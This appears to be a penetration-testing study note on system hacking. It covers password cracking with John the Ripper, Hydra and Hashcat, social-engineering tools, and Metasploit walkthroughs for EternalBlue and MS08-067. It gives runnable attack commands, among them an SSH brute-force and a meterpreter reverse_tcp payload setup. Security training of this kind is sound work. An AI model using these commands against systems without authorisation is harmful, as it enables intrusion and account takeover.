## System Hacking Techniques

### **What is System Hacking?**  
System hacking involves gaining unauthorized access to a system and escalating privileges to control it. Techniques vary from cracking passwords to social engineering.

### **1. Password Cracking**  
- **Definition**: Password cracking is the process of recovering passwords through various techniques.  

**Techniques**:  
1. **Brute-Force Attack**: Trying all possible combinations.  
2. **Dictionary Attack**: Using a list of common passwords.  
3. **Rainbow Tables**: Precomputed hash lookup tables.  

**Tools for Password Cracking**:  

1. **John the Ripper**  
   - **Why**: Fast and flexible password cracking tool.  
   - **Command**:  
     ```bash
     john --wordlist=/path/to/wordlist.txt hashfile
     ```  

2. **Hydra**  
   - **Why**: Brute-force tool for various network protocols (SSH, FTP, HTTP, etc.).  
   - **Command**:  
     ```bash
     hydra -l admin -P rockyou.txt ssh://192.168.1.10
     ```  

3. **Hashcat**  
   - **Why**: GPU-accelerated password cracker.  
   - **Command**:  
     ```bash
     hashcat -a 0 -m 1000 hash.txt wordlist.txt
     ```  
4. **Rainbow Tables**:  
   - Use precomputed hashes to reverse engineer passwords.
   - **Tools**: **Ophcrack**, **Cain and Abel**.

### **2. Social Engineering**  
- **Definition**: Manipulating people into divulging confidential information.  
- **Types**:  
   - Phishing : Crafting fake emails or websites to capture sensitive data.
   - Pretexting : Pretending to be someone trustworthy to acquire information.
   - Baiting : This tactic tricks the victim into unintentionally downloading malware into their system or revealing confidential personal or organizational information.

**Tools for Social Engineering**:  
1. **SET (Social Engineering Toolkit)**  
   - Simulates phishing attacks and payload delivery.  
   - **Command**:  
     ```bash
     setoolkit
     ```  

2. **GoPhish**  
   - Open-source phishing framework to test awareness.  

### **3. Metasploit Framework**  
- **Definition**: Metasploit is a powerful penetration testing framework for system exploitation.  

**Why Metasploit?**  
- Automated exploits.  
- Post-exploitation features.  

**Key Features**:
- Exploit Module: **Search for and exploit vulnerabilities**.
- Payload: **Deliver commands or backdoors**.
  
**Example Attack using Metasploit**:  
1. **Finding an Exploit**:  
   ```bash
   search type:exploit name:windows
   ```
   
2. **Exploit Target**:  
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   ```

3. **Set Payload**:
   ```bash
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   ```

4. **Launch Attack**:  
   ```bash
   exploit
   ```

**Basic Usage**:  
1. **Launch Metasploit**:  
   ```bash
   msfconsole
   ```  

2. **Search for Exploits**:  
   ```bash
   search windows/smb
   ```  

3. **Use Exploit**:  
   ```bash
   use exploit/windows/smb/ms08_067_netapi
   set RHOST 192.168.1.10
   exploit
   ```  
